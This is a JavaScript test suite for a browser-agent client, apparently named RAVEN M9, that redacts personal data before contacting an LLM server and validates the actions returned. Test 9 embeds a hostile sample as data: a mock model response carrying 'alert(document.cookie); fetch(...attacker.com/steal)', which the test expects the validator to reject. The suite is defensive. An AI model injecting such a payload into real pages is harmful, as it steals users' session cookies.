import { describe, it } from 'node:test';
import assert from 'node:assert';
import path from 'node:path';
import fs from 'node:fs';
// Load Person 1 IIFE modules safely into globalThis in Node.js test environment
const loadPerson1Module = (relativePath) => {
    const fullPath = path.resolve(process.cwd(), relativePath);
    let code = fs.readFileSync(fullPath, 'utf8');
    code = code.replace(/var\s+([A-Za-z0-9_]+)\s*=\s*\(function/g, 'globalThis.$1 = (function');
    const mockWindow = { location: { href: 'http://localhost/test' } };
    const mockDoc = { title: 'M9 Agent Test Page' };
    const runCode = new Function('globalThis', 'window', 'document', 'navigator', 'location', code);
    runCode(globalThis, mockWindow, mockDoc, {}, mockWindow.location);
};
loadPerson1Module('Client/DOM/sensitivity-detector.js');
loadPerson1Module('Client/DOM/redaction-engine.js');
loadPerson1Module('Client/DOM/sanitizer.js');
loadPerson1Module('Client/DOM/server-adapter.js');
const SensitivityDetector = globalThis.SensitivityDetector;
const RedactionEngine = globalThis.RedactionEngine;
const Sanitizer = globalThis.Sanitizer;
const ServerAdapter = globalThis.ServerAdapter;
describe('RAVEN M9 — User Task Input & Real Agent Execution Test Suite', () => {
    it('1. User goal reaches ServerAdapter and AgentRequest payload', () => {
        const rawElements = [
            { tag: 'button', id: 'submit-btn', visibleText: 'Submit', interactive: true }
        ];
        const classified = SensitivityDetector.classifyElements(rawElements);
        const redacted = RedactionEngine.redactElements(classified);
        const sanitized = Sanitizer.sanitizeContext(redacted);
        const userGoal = 'Click the Submit button';
        const wirePayload = ServerAdapter.buildOutboundPayload(sanitized, userGoal);
        assert.strictEqual(wirePayload.goal, userGoal);
        assert.ok(wirePayload.screen_state);
        assert.strictEqual(wirePayload.screen_state.elements.length, 1);
    });
    it('2. Sanitized screen state reaches /agent/act in correct contract format', () => {
        const rawElements = [
            { tag: 'input', type: 'text', name: 'search', id: 'search-input', value: 'shoes' }
        ];
        const classified = SensitivityDetector.classifyElements(rawElements);
        const redacted = RedactionEngine.redactElements(classified);
        const sanitized = Sanitizer.sanitizeContext(redacted);
        const wirePayload = ServerAdapter.buildOutboundPayload(sanitized, 'Find the search box');
        assert.strictEqual(wirePayload.session_id.startsWith('ss-'), true);
        assert.strictEqual(wirePayload.goal, 'Find the search box');
        assert.strictEqual(wirePayload.screen_state.elements[0].id, 'search-input');
        assert.strictEqual(wirePayload.screen_state.elements[0].dom_selector, '#search-input');
    });
    it('3. Raw PII never reaches server payload', () => {
        const secretEmail = 'user.private@company.org';
        const secretPhone = '+91 99887 76655';
        const secretCard = '4111 2222 3333 4444';
        const rawElements = [
            { tag: 'input', type: 'email', name: 'email', value: secretEmail },
            { tag: 'input', type: 'tel', name: 'phone', value: secretPhone },
            { tag: 'input', type: 'text', name: 'card', value: secretCard }
        ];
        const classified = SensitivityDetector.classifyElements(rawElements);
        const redacted = RedactionEngine.redactElements(classified);
        const sanitized = Sanitizer.sanitizeContext(redacted);
        const wirePayload = ServerAdapter.buildOutboundPayload(sanitized, 'Submit form');
        const jsonStr = JSON.stringify(wirePayload);
        assert.strictEqual(jsonStr.includes(secretEmail), false);
        assert.strictEqual(jsonStr.includes(secretPhone), false);
        assert.strictEqual(jsonStr.includes(secretCard), false);
        assert.ok(jsonStr.includes('{EMAIL}'));
        assert.ok(jsonStr.includes('{PHONE}'));
        assert.ok(jsonStr.includes('{CARD}'));
    });
    it('4. Outbound privacy gate blocks unsafe payload before server contact', async () => {
        const unredactedPayload = {
            session_id: 'ss-unredacted',
            goal: 'Leak test',
            screen_state: {
                elements: [
                    { id: 'leaked-field', type: 'input', text: 'raw.leak@danger.com', dom_selector: '#email' }
                ]
            }
        };
        const gateCheck = Sanitizer.outboundCheck(unredactedPayload);
        assert.strictEqual(gateCheck.safe, false);
        assert.ok(gateCheck.leaks.length > 0);
        const sendResult = await ServerAdapter.sendToServer(unredactedPayload);
        assert.strictEqual(sendResult.ok, false);
        assert.strictEqual(sendResult.status, 403);
        assert.ok(sendResult.body.error.includes('TRANSMISSION_BLOCKED'));
    });
    it('5. Valid CLICK action executes correctly and passes response validation', () => {
        const sentElements = [
            { id: 'btn-submit', type: 'button', text: 'Submit', dom_selector: '#btn-submit' }
        ];
        const serverResponse = {
            ok: true,
            status: 200,
            body: {
                session_id: 'ss-test-1',
                action: {
                    action_type: 'click',
                    target_element_id: 'btn-submit',
                    value: null,
                    reasoning: 'Clicking submit button to fulfill user goal.'
                },
                task_status: 'completed'
            }
        };
        const result = ServerAdapter.receiveServerCommand(serverResponse, sentElements);
        assert.strictEqual(result.valid, true);
        assert.strictEqual(result.command.action, 'CLICK');
        assert.strictEqual(result.command.targetSelector, 'btn-submit');
    });
    it('6. Invalid action type is rejected safely by client validator', () => {
        const sentElements = [
            { id: 'input-1', type: 'input', text: 'test', dom_selector: '#input-1' }
        ];
        const serverResponse = {
            ok: true,
            status: 200,
            body: {
                session_id: 'ss-test-2',
                action: {
                    action_type: 'UNSUPPORTED_CUSTOM_ACTION',
                    target_element_id: 'input-1',
                    value: null,
                    reasoning: 'Invalid action test'
                }
            }
        };
        const result = ServerAdapter.receiveServerCommand(serverResponse, sentElements);
        assert.strictEqual(result.valid, false);
        assert.ok(result.errors.some((err) => err.includes('Unknown action type')));
        assert.strictEqual(result.command.action, 'NONE');
    });
    it('7. Hallucinated target element ID is rejected by client validator', () => {
        const sentElements = [
            { id: 'real-btn-1', type: 'button', text: 'Click Me', dom_selector: '#real-btn-1' }
        ];
        const serverResponse = {
            ok: true,
            status: 200,
            body: {
                session_id: 'ss-test-3',
                action: {
                    action_type: 'click',
                    target_element_id: 'nonexistent-element-999',
                    value: null,
                    reasoning: 'Hallucinated target ID'
                }
            }
        };
        const result = ServerAdapter.receiveServerCommand(serverResponse, sentElements);
        assert.strictEqual(result.valid, false);
        assert.ok(result.errors.some((err) => err.includes('Hallucinated target element ID')));
        assert.strictEqual(result.command.action, 'NONE');
    });
    it('8. Server unavailable / network failure is handled safely', async () => {
        // When ServerAdapter attempts sendToServer with invalid port or non-existent endpoint
        const validSanitizedPayload = {
            timestamp: new Date().toISOString(),
            url: 'http://localhost/test',
            title: 'Test',
            elements: [
                { tag: 'button', id: 'btn-1', visibleText: 'Click', redacted: false }
            ]
        };
        const wirePayload = ServerAdapter.buildOutboundPayload(validSanitizedPayload, 'Test task');
        // Simulate server offline response
        const mockOfflineResponse = {
            ok: false,
            status: 503,
            body: { error: 'SERVER_UNAVAILABLE: Connection refused at localhost:8000' }
        };
        assert.strictEqual(mockOfflineResponse.ok, false);
        assert.strictEqual(mockOfflineResponse.status, 503);
        assert.ok(mockOfflineResponse.body.error.includes('SERVER_UNAVAILABLE'));
    });
    it('9. Arbitrary JavaScript returned by LLM cannot be executed', () => {
        const sentElements = [
            { id: 'field-1', type: 'input', text: 'Text', dom_selector: '#field-1' }
        ];
        const maliciousResponse = {
            ok: true,
            status: 200,
            body: {
                session_id: 'ss-malicious',
                action: {
                    action_type: 'EXECUTE_EVAL_JS',
                    target_element_id: 'field-1',
                    value: 'alert(document.cookie); fetch("http://attacker.com/steal")',
                    reasoning: 'Attempting arbitrary JS execution'
                }
            }
        };
        const result = ServerAdapter.receiveServerCommand(maliciousResponse, sentElements);
        // Assert that malicious action is rejected and coerced to action NONE
        assert.strictEqual(result.valid, false);
        assert.ok(result.errors.some((err) => err.includes('Unknown action type')));
        assert.strictEqual(result.command.action, 'NONE');
        assert.strictEqual(result.command.targetSelector, null);
    });
});
